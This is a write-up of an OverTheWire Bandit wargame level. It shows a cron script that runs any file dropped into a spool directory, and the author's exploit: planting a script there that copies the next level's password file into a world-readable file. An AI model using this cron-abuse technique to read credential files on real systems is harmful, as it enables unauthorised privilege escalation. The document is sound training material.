# Problem Link
[Level Page](https://overthewire.org/wargames/bandit/bandit24.html

# Solution
Following same steps as previous problem:

```bash
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh                                                                                                                              
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
Then I created a temporary directory and twho temporary files: password.txt and script.sh. the creation of the script in this directory is due to the fact that this cronjob deletes the scripts after execution.

```bash
bandit23@bandit:/etc/cron.d$ cd $(mktemp -d)                                                                                                                                               
bandit23@bandit:/tmp/tmp.n6v4Nv2yS8$ touch password.txt
bandit23@bandit:/tmp/tmp.n6v4Nv2yS8$ chmod 777 password.txt 
bandit23@bandit:/tmp/tmp.n6v4Nv2yS8$ vi script.sh
bandit23@bandit:/tmp/tmp.n6v4Nv2yS8$ chmod 777 script.sh 
bandit23@bandit:/tmp/tmp.n6v4Nv2yS8$ ls -l
total 4
-rwxrwxrwx 1 bandit23 bandit23  0 Jan  5 16:53 password.txt
-rwxrwxrwx 1 bandit23 bandit23 78 Jan  5 16:55 script.sh
bandit23@bandit:/tmp/tmp.n6v4Nv2yS8$ chmod 777 /tmp/tmp.n6v4Nv2yS8
```
The script pastes the content of `/etc/bandit_pass/bandit24` file to `password.txt`:

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.n6v4Nv2yS8/password.txt
```
Then I pasted my script to `` directory, so the cronjob would execute it as a bandit24 user, I waited for about two minutes, then I found the password in my password.txt file

```bash
bandit23@bandit:/tmp/tmp.n6v4Nv2yS8$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.n6v4Nv2yS8$ cat password.txt                                                                                                                                      
(password of bandit24)
```






